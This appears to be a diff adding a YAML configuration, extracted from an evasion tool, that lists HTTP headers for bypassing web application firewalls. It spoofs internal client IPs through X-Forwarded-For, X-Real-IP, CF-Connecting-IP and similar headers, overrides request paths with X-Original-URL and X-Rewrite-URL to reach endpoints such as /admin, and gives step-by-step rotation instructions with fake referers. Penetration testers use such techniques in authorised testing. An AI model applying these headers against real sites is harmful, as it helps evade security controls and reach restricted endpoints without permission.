@@ -1,0 +1,53 @@
+# WAF Bypass Headers — extracted from evasion.py waf_bypass_headers()
+# Technique: MITRE ATT&CK T1562 (Impair Defenses)
+# Usage: rotate spoofed_ip from ip_pool per request; set target_path to the endpoint under test
+
+headers:
+  # IP Spoofing — WAF may trust internal IPs and skip deep inspection
+  X-Forwarded-For: "127.0.0.1"       # rotate from ip_pool
+  X-Real-IP: "127.0.0.1"             # rotate from ip_pool
+  X-Client-IP: "127.0.0.1"           # rotate from ip_pool
+  X-Remote-IP: "127.0.0.1"           # rotate from ip_pool
+  X-Remote-Addr: "127.0.0.1"         # rotate from ip_pool
+  # Path Override — bypass URL-based WAF rules
+  X-Original-URL: "/"                # set to target_path
+  X-Rewrite-URL: "/"                 # set to target_path
+
+# Stealth base headers (always included via stealth_headers())
+stealth_headers:
+  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+  Accept-Language: "en-US,en;q=0.5"
+  Accept-Encoding: "gzip, deflate"
+  Connection: "keep-alive"
+  Upgrade-Insecure-Requests: "1"
+  Cache-Control: "no-cache"
+
+ip_pool:
+  - "127.0.0.1"
+  - "10.0.0.1"
+  - "172.16.0.1"
+  - "192.168.1.1"
+  - "10.10.10.1"
+  - "172.31.0.1"
+  - "192.168.0.1"
+  - "10.0.0.254"
+
+referer_pool:
+  - "https://www.google.com/"
+  - "https://www.bing.com/search?q="
+  - "https://duckduckgo.com/?q="
+  - "https://www.google.com.br/"
+
+# Additional headers for specific WAF vendors
+cloudflare_extra:
+  CF-Connecting-IP: "127.0.0.1"     # rotate from ip_pool; works on misconfigured origin-trust
+
+akamai_extra:
+  True-Client-IP: "127.0.0.1"       # rotate from ip_pool; trusted by some Akamai origin configs
+
+# Usage notes:
+# 1. Pick a random IP from ip_pool for each request
+# 2. Set X-Forwarded-For, X-Real-IP, X-Client-IP, X-Remote-IP, X-Remote-Addr to that IP
+# 3. Set X-Original-URL and X-Rewrite-URL to the path you are testing (e.g., /admin)
+# 4. Include a random Referer from referer_pool
+# 5. Add a random User-Agent from user_agents_2025.txt
